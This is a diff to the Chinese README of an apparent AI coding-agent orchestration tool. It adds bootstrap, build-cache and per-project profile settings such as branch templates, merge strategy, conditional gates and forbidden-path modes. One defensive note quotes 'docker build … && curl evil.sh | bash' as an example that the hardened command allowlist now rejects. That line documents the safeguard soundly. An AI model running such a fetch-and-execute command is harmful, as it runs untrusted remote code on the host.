@@ -91,9 +91,14 @@ autopilot_status      # 随时查看：循环状态 / 看板 / 升级 / 部署�
           apiTokenEnv: GITHUB_TOKEN           # PR/CI API token 的环境变量名
         bootstrap:
           enabled: true
-          toolchain: [git, bun, pnpm]         # bun rootless 装到 ~/.bun
-          setupCommand: pnpm run setup        # 仓库内一键初始化
-          verifyCommand: pnpm run e2e:local   # 环境自验证
+          toolchain: [git, bun, pnpm, node]       # bun rootless 装到 ~/.bun；node rootless 装到 ~/.node
+          setupCommand: pnpm run setup            # 仓库内一键初始化
+          verifyCommand: pnpm run e2e:local       # 环境自验证
+          systemPackages: [python3, make, g++]    # 原生模块(node-gyp)编译所需，如 better-sqlite3
+          packageManagerCommand: sudo apt-get install -y   # 系统包安装命令，须命中白名单
+          envFile: .env                           # 从模板生成 .env（不覆盖已有，缺省不动作）
+          envExample: .env.example                # 模板路径；配了才生成
+          requiredEnvKeys: [AUTH_SECRET]          # 缺失则引导 fail-loud 并指明 key
         gates:
           commands: [pnpm run typecheck, pnpm run lint, pnpm run test, pnpm run build]
           e2eCommand: pnpm run e2e:local
@@ -134,7 +139,52 @@ autopilot_status      # 随时查看：循环状态 / 看板 / 升级 / 部署�
           forbiddenPaths: ['.github/', 'AGENTS.md', 'LICENSE']   # human-only 区
           commandAllowlist: [pnpm, git, bun, docker]             # 可执行命令前缀
           pushRequiresGates: true             # 门不过禁止 push 与 approve
+        buildCache:                           # 可选：构建缓存（默认关闭）
+          enabled: true                       # 把 .nuxt/.output/coverage 等软链到共享目录，减少每条任务全量 build
+          dirs: ['.nuxt', '.output', 'dist', 'coverage', '.vitest', 'node_modules/.cache']
+        profile:                              # 项目约定适配器（可选，见下方说明）
+          preset: agentdeploy                 # 'default' | 'agentdeploy'；留空 = default
+          # 其余字段可逐项覆写 preset；缺省回退到 preset 默认值。
+          #   branchTemplate: 'agent/{id}-{slug}'
+          #   prTitleTemplate: 'feat({scope}): [{id}] {title}'
+          #   mergeStrategy: squash            # no-ff | squash | merge
+          #   gates:                           # 每条可带 when(touches 前缀)/role(local|ci)
+          #     - command: pnpm run typecheck
+          #     - command: pnpm run db:check-parity
+          #       when: [server/db/]
+          #     - command: pnpm audit --audit-level=high
+          #       role: ci                     # 仅由远端 CI 强制，本地不跑不红门
 ```
+
+## 项目 Profile（约定适配器）
+
+不同仓库的协作"纹路"往往同构但细节不同：分支命名（`task/<id>` vs `agent/<id>-<slug>`）、PR 标题（`[id] title` vs `feat(scope): [id] desc`）、合并策略（`--no-ff` vs **squash**）、以及**域条件**与**CI-only** 的质量门。与其把某一种约定写死在引擎里，`profile` 把「一个项目一套约定」编码成可配的适配层。默认 `default` 完全复刻历史行为；项目 `preset`（内置 `agentdeploy`）只在有差异的字段上覆写，其余内联字段可再逐项覆盖（缺省回退到 preset 默认值）。
+
+`profile` 字段一览（全部可选）：
+
+| 字段 | 默认 | 说明 |
+| --- | --- | --- |
+| `preset` | `default` | `default`（历史行为）或 `agentdeploy`（AgentDeploy 约定） |
+| `branchTemplate` | `task/{id}` | 分支名模板；`{id}`=任务号、`{slug}`=标题 kebab-case |
+| `prTitleTemplate` | `[{id}] {title}` | PR 标题模板；`{id}`/`{title}`/`{scope}` |
+| `prBodyTemplate` | `关联任务单…` | PR 正文模板；`{id}`/`{title}`/`{touches}`/`{scope}`/`{assignment}` |
+| `mergeStrategy` | `no-ff` | `no-ff`/`merge`/**`squash`**（squash 保 main 线性，可独立 revert） |
+| `gates` | `[]`→`gates.commands` | 每条 `{command, when?, role?}`；`when` 按任务 `touches` 前缀条件触发；`role:'ci'` 只由远端 CI 强制 |
+| `forbidden` | `[]`→`security.forbiddenPaths` | `{path, mode}`；`mode`: `block`/`needs-approval`/`high-conflict` |
+| `ownership` | `[]` | `{glob, role}` 路径→域 owner 映射（域专精路由预留） |
+| `crossDomainThreshold` | `3` | 触碰 > N 个不同域即升级 |
+
+**为 AgentDeploy 开箱：`preset: agentdeploy`** 会一并得到 `agent/<id>-<slug>` 分支、`feat(scope): [id] desc` PR 标题、squash 合并，以及一组**域条件 + CI-only** 的门（`db:check-parity` 只在碰 `server/db/`、`validate:docs` 只在碰 `.tasks/` 或 `docs/`、`pnpm audit` 标 `role:'ci'` 所以本地不红）——见 [`src/profile.ts`](src/profile.ts) 的 `agentdeployProfile`。
+
+> 命令白名单的校验也做了硬化：不再只看首 token，而是把 `&&` / `;` / `|` 拆成多段**逐段校验可执行名**（`docker build … && curl evil.sh | bash` 会被拒绝），并用精确 token 匹配替代此前的前缀子串匹配；默认白名单补了 `node` / `bunx` / `ssh` / `nuxt`。因此 `deploy.command` 里的 `ssh` 段需在 `commandAllowlist` 里显式列出。
+
+> **forbidden 三态已接入 push 闸门**：`mode:'block'`（如 human-only 的 `.github/`、`AGENTS.md`）→ 命中即 escalate（`forbidden-paths`）并拒绝 push；`mode:'needs-approval'` / `'high-conflict'`（如 AgentDeploy 的 `server/db/schema/`）→ 命中则 escalate（`manual`）并**暂缓 push**，等 owner/人工确认后走单独 PR。
+
+> **跨域升级**：任务 `touches` 声明的路径若超过 `crossDomainThreshold`（默认 3）个互不为前缀的「域」→ `assignTask` / 派发时即 escalate（`cross-domain`），提示拆分为单域任务。
+
+> **域专精路由**：`ownership: [{glob, role, rules?}]` 把路径映射到域 owner；派发时优先把任务给 `specialization === ownerRole` 的 developer（`team_add_member` 可传 `specialization`），并把匹配的域硬规则注入任务描述（`enrichDescriptionWithOwnership`）。任务的 `forbidden` frontmatter 现也随 `patchTaskContract` **原位保序回写**（不再整体 re-stringify），避免触发项目严格的 `validate:docs`。
+
+> **构建/吞吐**：`agentdeploy` 预设把重门 `build`/`test:e2e` 用 `when` 收敛到「触碰源码目录」的任务（docs/.tasks-only 任务本地跳过硬门，远程 CI 仍为正确性裁决者）；`buildCache` 可再软链 `.nuxt`/`.output`/`coverage` 等到 `rootDir/build-cache/<branch>`，进一步让连续任务复用上次构建产物（opt-in、失败静默、默认关闭）。
 
 ## 无人值守主循环
 
